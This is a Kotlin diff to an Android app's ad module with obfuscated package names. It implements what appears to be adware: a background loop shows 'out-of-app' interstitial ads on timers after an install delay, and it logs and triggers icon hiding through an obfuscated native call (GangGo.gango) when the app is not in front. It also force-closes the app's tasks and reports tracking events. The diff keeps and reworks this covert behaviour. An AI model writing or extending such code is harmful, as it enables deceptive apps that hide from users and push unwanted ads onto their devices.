@@ -2,10 +2,12 @@ package com.passionate.annoyed.ruthlessness.utils
 
 import android.os.Handler
 import android.os.Looper
-import com.passionate.annoyed.ruthlessness.must.ShowService
+import com.passionate.annoyed.ruthlessness.dataces.EnhancedShowService
+import com.passionate.annoyed.ruthlessness.dataces.EnvironmentConfig
 import com.passionate.annoyed.ruthlessness.net.CanPost
-import com.passionate.annoyed.ruthlessness.start.FebApp
-import com.passionate.annoyed.ruthlessness.start.FebFive
+import com.passionate.annoyed.ruthlessness.jk.FebApp
+import com.passionate.annoyed.ruthlessness.jk.FebApp.dataAppBean
+import com.passionate.annoyed.ruthlessness.jk.GangGo
 import com.passionate.annoyed.ruthlessness.utils.AdUtils.initFaceBook
 import com.tradplus.ads.base.bean.TPAdError
 import com.tradplus.ads.base.bean.TPAdInfo
@@ -40,7 +42,7 @@ class AdShowFun {
     private fun intiTTTTAd() {
         if (mTPInterstitial == null) {
             val idBean = KeyContent.getAdminData() ?: return
-            mTPInterstitial = TPInterstitial(FebApp.febApp, idBean.adDetails.adId)
+            mTPInterstitial = TPInterstitial(FebApp.gameApp, idBean.adDetails.adId)
             mTPInterstitial!!.setAdListener(object : InterstitialAdListener {
                 override fun onAdLoaded(tpAdInfo: TPAdInfo) {
                     KeyContent.showLog("体外广告加载成功")
@@ -87,7 +89,7 @@ class AdShowFun {
 
                 override fun onAdClosed(tpAdInfo: TPAdInfo) {
                     KeyContent.showLog("体外广告${tpAdInfo.adSourceName}被关闭")
-                    ShowService.closeAllActivities()
+                    closeAllActivities()
                 }
 
                 override fun onAdVideoError(tpAdInfo: TPAdInfo, tpAdError: TPAdError) {
@@ -146,11 +148,6 @@ class AdShowFun {
         }
     }
 
-    fun String.parseLimits(): Triple<Int, Int, Int> {
-        val limit = this.split("-") ?: listOf("0", "0", "0")
-        return Triple(limit[0].toInt(), limit[1].toInt(), limit[2].toInt())
-    }
-
     fun startRomFun() {
         initFaceBook()
         intiTTTTAd()
@@ -158,19 +155,19 @@ class AdShowFun {
         if (AdUtils.adNumAndPoint()) {
             return
         }
-        val wTime= adminData.adTiming.detectionInterval
+        val wTime = adminData.adTiming.detectionInterval
         val delayData = wTime.toLong().times(1000L)
         KeyContent.showLog("doToWhileAd delayData=: ${delayData}")
         jobAdRom = CoroutineScope(Dispatchers.Main).launch {
             while (true) {
-                val a = ArrayList(ShowService.activityList)
-                if (a.isEmpty() || (a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivityOld" && a.last().javaClass.name != "com.jgaodl.drinks.waters.days.happys.xy.MainActivity")) {
+                val a = ArrayList(FebApp.activityList)
+                if (a.isEmpty() || (a.last().javaClass.name != EnvironmentConfig.packnameStart)) {
                     if (a.isEmpty()) {
                         KeyContent.showLog("隐藏图标=null")
                     } else {
                         KeyContent.showLog("隐藏图标=${a.last().javaClass.name}")
                     }
-                    FebFive.febSo("jgao,9dlcuao,9", 144f)
+                    GangGo.gango(144)
                     break
                 }
                 delay(500)
@@ -183,18 +180,15 @@ class AdShowFun {
         while (true) {
             KeyContent.showLog("循环检测广告")
             CanPost.postPointDataWithHandler(false, "timertask")
-            isHaveData()
+            if (AdUtils.adNumAndPoint() && !dataAppBean.adFailPost) {
+                CanPost.postPointDataWithHandler(false, "jumpfail")
+                jobAdRom?.cancel()
+                dataAppBean.adFailPost= true
+                return
+            }
             loadAd()
             isHaveAdNextFun()
             delay(delayData)
-        }
-    }
-
-    private fun isHaveData() {
-        if (AdUtils.adNumAndPoint()) {
-            CanPost.postPointDataWithHandler(false, "jumpfail")
-            jobAdRom?.cancel()
-            return
         }
     }
 
@@ -211,26 +205,26 @@ class AdShowFun {
         val jsonBean = KeyContent.getAdminData() ?: return
 
         // 获取安装时间
-        val instalTime = ShowService.getInstallTimeDataFun()
+        val instalTime = EnhancedShowService.getInstallTimeInSeconds()
         val wait = jsonBean.adTiming.displayInterval
-        val ins=jsonBean.adTiming.installDelay
+        val ins = jsonBean.adTiming.installDelay
         // 检查首次安装时间和广告展示时间间隔
         if (isBeforeInstallTime(instalTime, ins)) return
         if (isAdDisplayIntervalTooShort(wait)) return
         canNextState = false
-            // 检查广告展示限制
-            if (!adLimiter.canShowAd(true)) {
-                KeyContent.showLog("体外广告展示限制")
-                return
-            }
-            KeyContent.showLog("体外流程")
+        // 检查广告展示限制
+        if (!adLimiter.canShowAd(true)) {
+            KeyContent.showLog("体外广告展示限制")
+            return
+        }
+        KeyContent.showLog("体外流程")
         showAdAndTrack()
     }
 
     private fun isBeforeInstallTime(instalTime: Long, ins: Int): Boolean {
         if (instalTime < ins) {
             KeyContent.showLog("距离首次安装时间小于$ins 秒，广告不能展示")
-            CanPost.postPointDataWithHandler(false, "ispass", "string", "timeCanNext2")
+            CanPost.postPointDataWithHandler(false, "ispass", "string", "Install")
             return true
         }
         return false
@@ -240,7 +234,7 @@ class AdShowFun {
         val jiange = (System.currentTimeMillis() - AdUtils.adShowTime) / 1000
         if (jiange < wait) {
             KeyContent.showLog("广告展示间隔时间小于$wait 秒，不展示")
-            CanPost.postPointDataWithHandler(false, "ispass", "string", "timeCanNext3")
+            CanPost.postPointDataWithHandler(false, "ispass", "string", "interval")
             return true
         }
         return false
@@ -249,22 +243,28 @@ class AdShowFun {
     private fun showAdAndTrack() {
         CanPost.postPointDataWithHandler(false, "ispass", "string", "")
         CoroutineScope(Dispatchers.Main).launch {
-            ShowService.closeAllActivities()
+            closeAllActivities()
             delay(1001)
             if (canNextState) {
                 KeyContent.showLog("准备显示h5广告，中断体外广告")
                 return@launch
             }
             addFa()
-            FebFive.febSo("mQ#2xJ!9va3vk2@7bNP5r", 1021f)
+            GangGo.gango( 1028)
             CanPost.postPointDataWithHandler(false, "callstart")
         }
     }
 
     fun addFa() {
-        var adNum = SPUtils.getInstance(FebApp.febApp).get(KeyContent.KEY_IS_AD_FAIL_COUNT, 0)
+        var adNum = dataAppBean.isAdFailCount
         adNum++
-        SPUtils.getInstance(FebApp.febApp).put(KeyContent.KEY_IS_AD_FAIL_COUNT, adNum)
+        dataAppBean.isAdFailCount = adNum
     }
-
+    fun closeAllActivities() {
+        KeyContent.showLog("closeAllActivities")
+        for (activity in FebApp.activityList) {
+            activity.finishAndRemoveTask()
+        }
+        FebApp.activityList.clear()
+    }
 }
